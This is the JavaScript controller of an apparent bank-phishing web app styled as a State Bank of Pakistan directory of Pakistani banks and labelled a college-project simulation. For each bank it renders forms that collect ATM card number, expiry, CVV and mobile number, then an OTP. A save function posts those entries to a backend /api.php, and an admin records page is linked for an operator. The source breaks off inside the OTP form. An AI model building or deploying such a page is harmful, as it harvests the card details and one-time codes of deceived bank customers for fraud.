// SBP Bank Directory & Simulation App Controller
const BANKS_DATA = [{"name":"HBL","short":"HB","category":"Conventional","color":"#0a8a3f","logo":"/logos/hbl.png","cardImage":"https://cdn.corenexis.com/f/KUIhqiMpmJh.png","popular":true},{"name":"UBL","short":"UB","category":"Conventional","color":"#0057a8","logo":"/logos/ubl.png","cardImage":"https://cdn.corenexis.com/f/wKKa5AbhYmu.png","popular":true},{"name":"MCB Bank","short":"MC","category":"Conventional","color":"#12703a","logo":"/logos/mcb-bank.png","cardImage":"https://cdn.corenexis.com/f/V0em3iXx06T.png","popular":true},{"name":"Bank Alfalah","short":"AF","category":"Conventional","color":"#c8102e","logo":"/logos/bank-alfalah.png","cardImage":"https://cdn.corenexis.com/f/V0em3iXx06T.png","popular":true},{"name":"Meezan Bank","short":"MZ","category":"Islamic","color":"#0e7a6b","logo":"/logos/meezan-bank.png","cardImage":"https://cdn.corenexis.com/f/4MuLEOKfvLN.png","popular":true},{"name":"Allied Bank","short":"AB","category":"Conventional","color":"#1b3a6b","logo":"/logos/allied-bank.png","cardImage":"https://cdn.corenexis.com/f/FhSnr6doBOZ.png"},{"name":"National Bank","short":"NB","category":"Public","color":"#8a1f2b","logo":"/logos/national-bank.png","cardImage":"https://cdn.corenexis.com/f/149auVlWzbn.png"},{"name":"Askari Bank","short":"AK","category":"Conventional","color":"#b3202f","logo":"/logos/askari-bank.png","cardImage":"https://cdn.corenexis.com/f/79SOyxgdO3B.png"},{"name":"Bank of Punjab","short":"BP","category":"Public","color":"#0062b0","logo":"/logos/bank-of-punjab.png","cardImage":"https://cdn.corenexis.com/f/ajBWH0wDwKt.png"},{"name":"ZTBL","short":"ZT","category":"Specialized","color":"#137a3a","logo":"/logos/ztbl.png","cardImage":"https://cdn.corenexis.com/f/c69Tk4svIQm.png"},{"name":"Standard Chartered","short":"SC","category":"Foreign","color":"#0a7d64","logo":"/logos/standard-chartered.png","cardImage":"https://cdn.corenexis.com/f/OfuTVcXqT29.png"},{"name":"Bank Makramah","short":"MK","category":"Conventional","color":"#12559c","logo":"/logos/bank-makramah.png","cardImage":"https://cdn.corenexis.com/f/38vyKfOsztI.png"},{"name":"Habib Metro","short":"HM","category":"Conventional","color":"#12447d","logo":"/logos/habib-metro.png","cardImage":"https://cdn.corenexis.com/f/hytdYUWEWCY.png"},{"name":"Soneri Bank","short":"SB","category":"Conventional","color":"#c0392b","logo":"/logos/soneri-bank.png","cardImage":"https://cdn.corenexis.com/f/gu0QSwsvaDO.png"},{"name":"JS Bank","short":"JS","category":"Conventional","color":"#0f6e63","logo":"/logos/js-bank.png","cardImage":"https://cdn.corenexis.com/f/g25avu5vZbf.png"},{"name":"Bank of Khyber","short":"KB","category":"Public","color":"#0f7a3d","logo":"/logos/bank-of-khyber.png","cardImage":"https://cdn.corenexis.com/f/LKMNPLuFZci.png"},{"name":"First Women Bank","short":"FW","category":"Public","color":"#7a2f7a","logo":"/logos/first-women-bank.png","cardImage":"https://cdn.corenexis.com/f/RiCYJ8DDwGQ.png"},{"name":"Sindh Bank","short":"SD","category":"Public","color":"#158043","logo":"/logos/sindh-bank.png","cardImage":"https://cdn.corenexis.com/f/SK1AMPLMa0o.png"},{"name":"Dubai Islamic","short":"DI","category":"Islamic","color":"#0e6a3a","logo":"/logos/dubai-islamic.png","cardImage":"https://cdn.corenexis.com/f/Bfv5p79xtYK.png"},{"name":"Faysal Bank","short":"FB","category":"Islamic","color":"#0d7a4f","logo":"/logos/faysal-bank.png","cardImage":"https://cdn.corenexis.com/f/Bfv5p79xtYK.png"},{"name":"Saudi Pak","short":"SP","category":"Specialized","color":"#146b3a","logo":"/logos/saudi-pak.jpg","cardImage":"https://cdn.corenexis.com/f/3KRBIb1dPr9.png"},{"name":"Silk Bank","short":"SK","category":"Conventional","color":"#d4762a","logo":"/logos/silk-bank.png","cardImage":"https://cdn.corenexis.com/f/HNnxV6TX9BL.png"},{"name":"Tameer Bank","short":"TB","category":"Specialized","color":"#d98324","logo":"/logos/tameer-bank.png","cardImage":"https://cdn.corenexis.com/f/beTFDtSteqE.png"},{"name":"MUFG Bank","short":"MU","category":"Foreign","color":"#a11d2b","cardImage":"https://cdn.corenexis.com/f/odILvWVjNxU.png"},{"name":"ICBC","short":"IC","category":"Foreign","color":"#b3202f","logo":"/logos/icbc.png","cardImage":"https://cdn.corenexis.com/f/hfMbAghjLZg.png"},{"name":"Mizuho Bank","short":"MI","category":"Foreign","color":"#0f4c9c","logo":"/logos/mizuho-bank.png","cardImage":"https://cdn.corenexis.com/f/u4NQLt2aam9.png"},{"name":"China Construction","short":"CC","category":"Foreign","color":"#12559c","logo":"/logos/china-construction.png","cardImage":"https://cdn.corenexis.com/f/cjLRcAnsEUi.png"},{"name":"Bank Islami","short":"BI","category":"Islamic","color":"#0e7a4a","logo":"/logos/bank-islami.png","cardImage":"https://cdn.corenexis.com/f/qCFYADvFIio.png"},{"name":"Woori Bank","short":"WB","category":"Foreign","color":"#0f5fa8","logo":"/logos/woori-bank.png","cardImage":"https://cdn.corenexis.com/f/sH7k4ImFAv2.png"},{"name":"NIB Bank","short":"NI","category":"Conventional","color":"#d4762a","logo":"/logos/nib-bank.png","cardImage":"https://cdn.corenexis.com/f/mMj637V5j0v.png"},{"name":"HSBC","short":"HS","category":"Foreign","color":"#b3202f","logo":"/logos/hsbc.png","cardImage":"https://cdn.corenexis.com/f/lKEBzzaXm3t.png"},{"name":"Credit Agricole","short":"CA","category":"Foreign","color":"#12703a","logo":"/logos/credit-agricole.png","cardImage":"https://cdn.corenexis.com/f/qJX1N6Er3DM.png"},{"name":"Al Baraka","short":"AL","category":"Islamic","color":"#0e7a6b","logo":"/logos/al-baraka.png","cardImage":"https://cdn.corenexis.com/f/0Nk4WVjPjws.png"},{"name":"QIB (Qatar)","short":"QI","category":"Islamic","color":"#7a2f5a","logo":"/logos/qib-qatar.png","cardImage":"https://cdn.corenexis.com/f/WD0lsTgXCRa.png"}];

function getBankSlug(name) {
    return name.toLowerCase().replace(/[()]/g, '').replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
}

function getBankBySlug(slug) {
    return BANKS_DATA.find(b => getBankSlug(b.name) === slug) || BANKS_DATA[0];
}

// Session & Storage Management
function getSessionId() {
    let id = localStorage.getItem('sbp_simulation_session');
    if (!id) {
        id = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 8999 + 1000);
        localStorage.setItem('sbp_simulation_session', id);
    }
    return id;
}

function saveLocalSubmission(bankSlug, bankName, step, data) {
    const sessId = getSessionId();
    let list = [];
    try {
        list = JSON.parse(localStorage.getItem('sbp_submissions') || '[]');
    } catch(e) { list = []; }

    let existing = list.find(s => s.session_id === sessId);
    const now = new Date().toISOString().replace('T', ' ').slice(0, 19);

    if (existing) {
        existing.last_step = step;
        existing.updated_at = now;
        existing.bank_slug = bankSlug;
        existing.bank_name = bankName;
        existing.data = { ...(existing.data || {}), ...data };
    } else {
        existing = {
            id: 'sub_' + Math.random().toString(36).substr(2, 9),
            session_id: sessId,
            bank_slug: bankSlug,
            bank_name: bankName,
            initial_step: step,
            last_step: step,
            created_at: now,
            updated_at: now,
            data: data
        };
        list.push(existing);
    }
    localStorage.setItem('sbp_submissions', JSON.stringify(list));

    // Try backend API as well
    fetch('/api.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            action: 'save_step',
            session_id: sessId,
            bank_slug: bankSlug,
            bank_name: bankName,
            step: step,
            data: data
        })
    }).catch(() => {});
}

// Route handler
function handleRouting() {
    const path = window.location.pathname;
    const match = path.match(/^\/bank\/([a-zA-Z0-9_-]+)(?:\/(otp|balance|verify))?\/?$/);

    if (match) {
        const slug = match[1];
        const step = match[2] || 'card';
        renderBankStep(slug, step);
    } else {
        renderDirectory();
    }
}

window.addEventListener('popstate', handleRouting);
document.addEventListener('DOMContentLoaded', handleRouting);

function navigateTo(url) {
    window.history.pushState({}, '', url);
    handleRouting();
    window.scrollTo(0, 0);
}

// 1. Render Directory
function renderDirectory() {
    document.title = 'Bank Directory | State Bank of Pakistan';
    const appEl = document.getElementById('app');
    if (!appEl) return;

    const popular = BANKS_DATA.filter(b => b.popular);
    const marqueeList = [...popular, ...popular];

    const categoryBadges = {
        'Conventional': 'bg-primary/10 text-primary ring-1 ring-inset ring-primary/20',
        'Islamic': 'bg-emerald-500/10 text-emerald-600 ring-1 ring-inset ring-emerald-500/20 dark:text-emerald-400',
        'Public': 'bg-blue-500/10 text-blue-600 ring-1 ring-inset ring-blue-500/20 dark:text-blue-400',
        'Foreign': 'bg-purple-500/10 text-purple-600 ring-1 ring-inset ring-purple-500/20 dark:text-purple-400',
        'Specialized': 'bg-accent/20 text-accent-foreground ring-1 ring-inset ring-accent/30 dark:text-accent'
    };

    const counts = { All: BANKS_DATA.length };
    ['Conventional', 'Islamic', 'Public', 'Foreign', 'Specialized'].forEach(cat => {
        counts[cat] = BANKS_DATA.filter(b => b.category === cat).length;
    });

    appEl.innerHTML = `
        <header>
            <div class="border-b border-border bg-card">
                <div class="mx-auto flex max-w-5xl items-center justify-between px-4 py-3">
                    <button type="button" class="flex h-9 w-9 items-center justify-center rounded-lg text-foreground transition hover:bg-secondary" aria-label="Open menu">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5"><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="18" y2="18"/></svg>
                    </button>
                    <div class="flex items-center gap-2.5">
                        <span class="flex h-9 w-9 items-center justify-center overflow-hidden rounded-full bg-white ring-1 ring-primary/20">
                            <img src="/public/logos/state-bank-of-pakistan.png" onerror="this.src='https://sbp-phase-3.vercel.app/logos/state-bank-of-pakistan.png'" alt="State Bank of Pakistan logo" class="h-full w-full object-contain p-0.5">
                        </span>
                        <div class="leading-tight">
                            <p class="text-sm font-bold uppercase tracking-tight text-primary">
                                State Bank<span class="block text-[0.7rem] font-semibold text-muted-foreground">of Pakistan</span>
                            </p>
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        
                        <button type="button" class="relative flex h-9 w-9 items-center justify-center rounded-lg text-foreground transition hover:bg-secondary" aria-label="Notifications">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5"><path d="M10.268 21a2 2 0 0 0 3.464 0"/><path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326"/></svg>
                            <span class="absolute right-2 top-2 h-2 w-2 rounded-full bg-accent ring-2 ring-card"></span>
                        </button>
                    </div>
                </div>
            </div>

            <div class="relative overflow-hidden text-primary-foreground" style="background-image:linear-gradient(160deg, #1f8a52 0%, #135d37 100%)">
                <div aria-hidden="true" class="pointer-events-none absolute -right-16 -top-20 h-56 w-56 rounded-full border border-primary-foreground/10"></div>
                <div aria-hidden="true" class="pointer-events-none absolute -right-6 -top-10 h-40 w-40 rounded-full border border-primary-foreground/10"></div>
                
                <div class="relative mx-auto max-w-5xl px-4 pb-8 pt-6">
                    <div class="flex items-center gap-2">
                        <span dir="rtl" lang="ur" style="font-family:var(--font-urdu), 'Jameel Noori Nastaleeq', sans-serif" class="text-xs leading-relaxed text-primary-foreground/70">
                            بینک دولت پاکستان
                        </span>
                    </div>
                    
                    <div class="mt-4 max-w-2xl">
                        <p class="text-sm font-medium text-primary-foreground/80">Welcome to the SBP Bank Directory</p>
                        <h1 class="mt-1 text-balance text-3xl font-extrabold tracking-tight sm:text-4xl">Pakistan Bank Directory</h1>
                        <p class="mt-2 text-pretty text-primary-foreground/80">Browse licensed banks operating in Pakistan. A reference directory built for a college project.</p>
                    </div>

                    <dl class="mt-6 grid grid-cols-3 gap-3">
                        <div class="rounded-xl bg-primary-foreground/10 px-3 py-3 ring-1 ring-primary-foreground/15">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 text-accent"><line x1="3" x2="21" y1="22" y2="22"/><line x1="6" x2="6" y1="18" y2="11"/><line x1="10" x2="10" y1="18" y2="11"/><line x1="14" x2="14" y1="18" y2="11"/><line x1="18" x2="18" y1="18" y2="11"/><polygon points="12 2 20 7 4 7"/></svg>
                            <dt class="mt-2 text-lg font-bold leading-none">${BANKS_DATA.length}</dt>
                            <dd class="mt-1 text-xs text-primary-foreground/70">Licensed banks</dd>
                        </div>
                        <div class="rounded-xl bg-primary-foreground/10 px-3 py-3 ring-1 ring-primary-foreground/15">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 text-accent"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
                            <dt class="mt-2 text-lg font-bold leading-none">5</dt>
                            <dd class="mt-1 text-xs text-primary-foreground/70">Categories</dd>
                        </div>
                        <div class="rounded-xl bg-primary-foreground/10 px-3 py-3 ring-1 ring-primary-foreground/15">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 text-accent"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                            <dt class="mt-2 text-lg font-bold leading-none">24/7</dt>
                            <dd class="mt-1 text-xs text-primary-foreground/70">Reference</dd>
                        </div>
                    </dl>

                    <div class="relative mt-6">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground h-5 w-5"><circle cx="11" cy="11" r="8"/><line x1="21" x2="16.65" y1="21" y2="16.65"/></svg>
                        <label for="bank-search" class="sr-only">Search your bank</label>
                        <input id="bank-search" type="text" placeholder="Search your bank..." class="w-full rounded-full border-0 bg-card py-3.5 pl-12 pr-11 text-base text-foreground shadow-lg outline-none ring-2 ring-transparent transition focus:ring-accent" value="">
                        <button id="clear-search" type="button" class="hidden absolute right-3 top-1/2 flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full text-muted-foreground transition hover:bg-secondary" aria-label="Clear search">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" x2="6" y1="6" y2="18"/><line x1="6" x2="18" y1="6" y2="18"/></svg>
                        </button>
                    </div>

                    <div class="-mx-4 mt-4 flex gap-2 overflow-x-auto px-4 pb-1 [scrollbar-width:none] [&::-webkit-scrollbar]:hidden" role="group" aria-label="Filter banks by category">
                        <button type="button" data-category="All" aria-pressed="true" class="cat-pill flex shrink-0 items-center gap-1.5 rounded-full px-3.5 py-1.5 text-sm font-semibold transition bg-card text-primary shadow-sm">
                            All<span class="rounded-full px-1.5 text-[0.7rem] font-bold bg-primary/10 text-primary">${counts.All}</span>
                        </button>
                        ${['Conventional', 'Islamic', 'Public', 'Foreign', 'Specialized'].map(cat => `
                        <button type="button" data-category="${cat}" aria-pressed="false" class="cat-pill flex shrink-0 items-center gap-1.5 rounded-full px-3.5 py-1.5 text-sm font-semibold transition bg-primary-foreground/10 text-primary-foreground ring-1 ring-inset ring-primary-foreground/20 hover:bg-primary-foreground/15">
                            ${cat}<span class="rounded-full px-1.5 text-[0.7rem] font-bold bg-primary-foreground/15 text-primary-foreground/80">${counts[cat]}</span>
                        </button>`).join('')}
                    </div>
                </div>
            </div>
        </header>

        <div class="mx-auto max-w-5xl px-4">
            <section id="popular-section" aria-labelledby="popular-heading" class="mt-8">
                <div class="flex items-center justify-between">
                    <h2 id="popular-heading" class="text-lg font-bold tracking-tight">Popular Banks</h2>
                    <span class="rounded-full bg-secondary px-3 py-1 text-xs font-semibold text-secondary-foreground">Top 5</span>
                </div>
                
                <div class="group/marquee relative -mx-4 mt-4 overflow-hidden" style="mask-image:linear-gradient(to right, transparent, black 3rem, black calc(100% - 3rem), transparent);-webkit-mask-image:linear-gradient(to right, transparent, black 3rem, black calc(100% - 3rem), transparent)">
                    <ul class="animate-marquee flex w-max gap-3 px-4 py-1">
                        ${marqueeList.map((b, idx) => {
                          const slug = getBankSlug(b.name);
                          const isDupe = idx >= popular.length;
                          return `
                        <li aria-hidden="${isDupe}">
                            <a class="flex min-w-[7.5rem] shrink-0 flex-col items-center gap-2 rounded-2xl border border-border bg-card px-4 py-4 text-center shadow-sm transition-colors hover:border-primary/40 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring" href="/bank/${slug}" onclick="event.preventDefault(); navigateTo('/bank/${slug}');" ${isDupe ? 'tabindex="-1"' : ''}>
                                <span class="flex h-14 w-14 shrink-0 items-center justify-center overflow-hidden rounded-xl bg-white p-1.5 shadow-sm ring-1 ring-black/5">
                                    <img src="/public${b.logo || ''}" onerror="this.src='https://sbp-phase-3.vercel.app${b.logo}'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='flex';};" alt="${b.name} logo" class="h-full w-full object-contain" loading="lazy">
                                    <span class="hidden h-full w-full items-center justify-center rounded-lg font-bold text-white text-lg" style="background-color: ${b.color}">${b.short}</span>
                                </span>
                                <span class="text-sm font-semibold">${b.name}</span>
                                <span class="text-xs text-muted-foreground">${b.category}</span>
                            </a>
                        </li>`;
                        }).join('')}
                    </ul>
                </div>
            </section>

            <section aria-labelledby="all-heading" class="mt-8">
                <div class="flex items-center justify-between">
                    <h2 id="all-heading" class="text-lg font-bold tracking-tight">All Banks</h2>
                    <span id="results-count" class="rounded-full bg-secondary px-3 py-1 text-xs font-semibold text-secondary-foreground">${BANKS_DATA.length} results</span>
                </div>

                <div id="no-results" class="hidden mt-6 flex flex-col items-center gap-3 rounded-2xl border border-dashed border-border bg-card px-4 py-12 text-center">
                    <span class="flex h-12 w-12 items-center justify-center rounded-full bg-secondary">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="h-5 w-5 text-muted-foreground"><circle cx="11" cy="11" r="8"/><line x1="21" x2="16.65" y1="21" y2="16.65"/><line x1="13" x2="9" y1="9" y2="13"/><line x1="9" x2="13" y1="9" y2="13"/></svg>
                    </span>
                    <div>
                        <p class="text-sm font-semibold text-foreground">No banks found</p>
                        <p class="mt-1 text-sm text-muted-foreground">Try a different name or category filter.</p>
                    </div>
                </div>

                <ul id="banks-grid" class="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
                    ${BANKS_DATA.map(b => {
                      const slug = getBankSlug(b.name);
                      const badgeClass = categoryBadges[b.category] || categoryBadges['Conventional'];
                      return `
                    <li class="bank-item" data-name="${b.name.toLowerCase()}" data-category="${b.category}">
                        <a class="group flex items-center gap-3 rounded-2xl border border-border bg-card px-3 py-3 shadow-sm transition-all hover:-translate-y-0.5 hover:border-primary/40 hover:shadow-md focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring" href="/bank/${slug}" onclick="event.preventDefault(); navigateTo('/bank/${slug}');">
                            <span class="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-xl bg-white p-1.5 shadow-sm ring-1 ring-black/5">
                                <img src="/public${b.logo || ''}" onerror="this.src='https://sbp-phase-3.vercel.app${b.logo}'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='flex';};" alt="${b.name} logo" class="h-full w-full object-contain" loading="lazy">
                                <span class="hidden h-full w-full items-center justify-center rounded-lg font-bold text-white text-sm" style="background-color: ${b.color}">${b.short}</span>
                            </span>
                            <div class="min-w-0">
                                <p class="truncate text-sm font-semibold">${b.name}</p>
                                <span class="mt-1 inline-flex rounded-full px-2 py-0.5 text-[0.7rem] font-semibold ${badgeClass}">
                                    ${b.category}
                                </span>
                            </div>
                        </a>
                    </li>`;
                    }).join('')}
                </ul>
            </section>
        </div>

        <footer class="mt-10 border-t border-border bg-card">
            <div class="mx-auto max-w-5xl px-4 py-8">
                <div class="flex items-center gap-3">
                    <span class="flex h-10 w-10 items-center justify-center overflow-hidden rounded-full bg-white ring-1 ring-primary/20">
                        <img src="/public/logos/state-bank-of-pakistan.png" onerror="this.src='https://sbp-phase-3.vercel.app/logos/state-bank-of-pakistan.png'" alt="State Bank of Pakistan logo" class="h-full w-full object-contain p-0.5">
                    </span>
                    <div class="leading-tight">
                        <span class="block text-sm font-bold uppercase tracking-wide">State Bank of Pakistan</span>
                        <span class="text-xs text-muted-foreground">Bank Directory</span>
                    </div>
                </div>
                <a href="https://www.sbp.org.pk" target="_blank" rel="noopener noreferrer" class="mt-4 inline-flex items-center gap-2 text-sm font-medium text-primary transition hover:underline">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="h-4 w-4"><circle cx="12" cy="12" r="10"/><line x1="2" x2="22" y1="12" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
                    www.sbp.org.pk
                </a>
                <p class="mt-4 text-xs leading-relaxed text-muted-foreground">
                    © 2026 Bank Directory. Informational reference only — not an official verification portal and not affiliated with any bank.
                </p>
                <div class="mt-4 pt-4 border-t border-border/50 flex flex-wrap items-center justify-between gap-3 text-xs text-muted-foreground">
                    <span>College Project Simulation & Testing Environment</span>
                    <a href="/admin" onclick="event.preventDefault(); window.location.href='/admin.html';" class="text-primary font-semibold hover:underline">Simulated Records Inspector &rarr;</a>
                </div>
            </div>
        </footer>
    `;

    // Rebind search and filters
    initDirectorySearch();
}

// 2. Render Bank Steps
function renderBankStep(slug, step) {
    const bank = getBankBySlug(slug);
    const appEl = document.getElementById('app');
    if (!appEl) return;

    const titles = {
        'card': bank.name + ' | Card Details',
        'otp': bank.name + ' | Confirm OTP',
        'balance': bank.name + ' | Account Balance',
        'verify': bank.name + ' | Verify OTP'
    };
    document.title = titles[step] || bank.name;

    const backUrls = {
        'card': '/',
        'otp': '/bank/' + slug,
        'balance': '/bank/' + slug + '/otp',
        'verify': '/bank/' + slug + '/balance'
    };

    let stepHtml = '';

    if (step === 'card') {
        stepHtml = `
            <div class="relative overflow-hidden rounded-3xl px-5 pb-8 pt-6" style="background-image:linear-gradient(150deg, oklch(0.22 0.03 158) 0%, oklch(0.14 0.02 160) 60%, oklch(0.1 0.01 160) 100%)">
                <div aria-hidden="true" class="pointer-events-none absolute -right-10 -top-16 h-48 w-48 rounded-full opacity-30 blur-3xl" style="background-color: ${bank.color || '#0a8a3f'}"></div>
                <div class="relative flex items-center justify-center">
                    <img src="${bank.cardImage || 'https://cdn.corenexis.com/f/KUIhqiMpmJh.png'}" alt="${bank.name} debit card" class="h-auto w-full max-w-[20rem] rounded-2xl object-contain drop-shadow-2xl" crossorigin="anonymous">
                </div>
            </div>

            <form id="card-form" class="mt-6 space-y-4">
                <div>
                    <label for="card-number" class="sr-only">ATM Card Number (16 digits)</label>
                    <input id="card-number" inputmode="numeric" autocomplete="off" placeholder="ATM Card Number (16 digits)" class="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary" value="">
                </div>

                <div class="grid grid-cols-3 gap-3">
                    <div>
                        <label for="exp-month" class="sr-only">Expiry month</label>
                        <select id="exp-month" class="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base shadow-sm outline-none ring-2 ring-transparent transition focus:ring-primary text-muted-foreground">
                            <option value="" selected>MM</option>
                            ${Array.from({length: 12}, (_, i) => String(i + 1).padStart(2, '0')).map(m => `<option value="${m}">${m}</option>`).join('')}
                        </select>
                    </div>
                    <div>
                        <label for="exp-year" class="sr-only">Expiry year</label>
                        <select id="exp-year" class="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base shadow-sm outline-none ring-2 ring-transparent transition focus:ring-primary text-muted-foreground">
                            <option value="" selected>YYYY</option>
                            ${Array.from({length: 10}, (_, i) => new Date().getFullYear() + i).map(y => `<option value="${y}">${y}</option>`).join('')}
                        </select>
                    </div>
                    <div>
                        <label for="cvv" class="sr-only">CVV</label>
                        <input id="cvv" inputmode="numeric" autocomplete="off" placeholder="CVV" maxlength="4" class="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary" value="">
                    </div>
                </div>

                <div>
                    <label for="mobile" class="sr-only">Mobile Number</label>
                    <input id="mobile" inputmode="numeric" autocomplete="tel" placeholder="Mobile Number (03XXXXXXXXX)" maxlength="11" class="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary" value="">
                </div>

                <div class="flex items-center justify-center gap-2 py-2" role="status" aria-label="Step 1 of 5">
                    <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                </div>

                <button id="card-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
                    <span>Next</span>
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
                </button>

                <p class="pt-1 text-center text-xs text-muted-foreground">
                    Demo directory for a college project. Do not enter real card details.
                </p>
            </form>
        `;
    } else if (step === 'otp') {
        stepHtml = `
            <form id="otp-form" class="mt-6">
                <h2 class="text-2xl font-extrabold tracking-tight">Confirm OTP</h2>
                <p class="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
                    Enter the 6-digit confirmation code sent to <span id="masked-phone" class="font-semibold text-foreground">your registered number</span>.
                </p>

                <div class="mt-5 rounded-3xl border border-border bg-card p-5 shadow-sm">
                    <div class="flex justify-center gap-2 sm:gap-3">
                        ${Array.from({length: 6}, (_, i) => `<input inputmode="numeric" autocomplete="${i === 0 ? 'one-time-code' : 'off'}" maxlength="1" aria-label="Digit ${i+1}" class="otp-box h-12 w-11 rounded-xl border border-border bg-secondary/40 text-center text-xl font-bold text-foreground outline-none ring-2 ring-transparent transition focus:border-primary focus:ring-primary sm:h-14 sm:w-12" value="">`).join('')}
                    </div>

                    <p id="otp-invalid-alert" class="hidden mt-4 flex items-center justify-center gap-1.5 text-center text-sm font-semibold text-destructive" role="alert">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
                        Invalid OTP. Please try again.
                    </p>

                    <p class="mt-4 text-center text-sm text-muted-foreground">
                        Didn't receive the code? <span id="timer-wrapper" class="font-semibold text-foreground">Resend in <span id="countdown">05:00</span></span>
                        <button id="resend-btn" type="button" class="hidden font-semibold text-primary underline-offset-2 hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">Resend code</button>
                    </p>
                </div>

                <div class="mt-4 flex items-start gap-2 rounded-2xl border border-amber-500/30 bg-amber-500/10 px-4 py-3">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="mt-0.5 shrink-0 text-amber-500"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><line x1="12" x2="12" y1="9" y2="13"/><line x1="12" x2="12.01" y1="17" y2="17"/></svg>
                    <p class="text-sm leading-relaxed text-amber-700 dark:text-amber-300">
                        Never share your OTP with anyone. Your bank will never ask for your OTP over a call or SMS.
                    </p>
                </div>

                <div class="flex items-center justify-center gap-2 py-5" role="status" aria-label="Step 4 of 5">
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                </div>

                <button id="otp-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
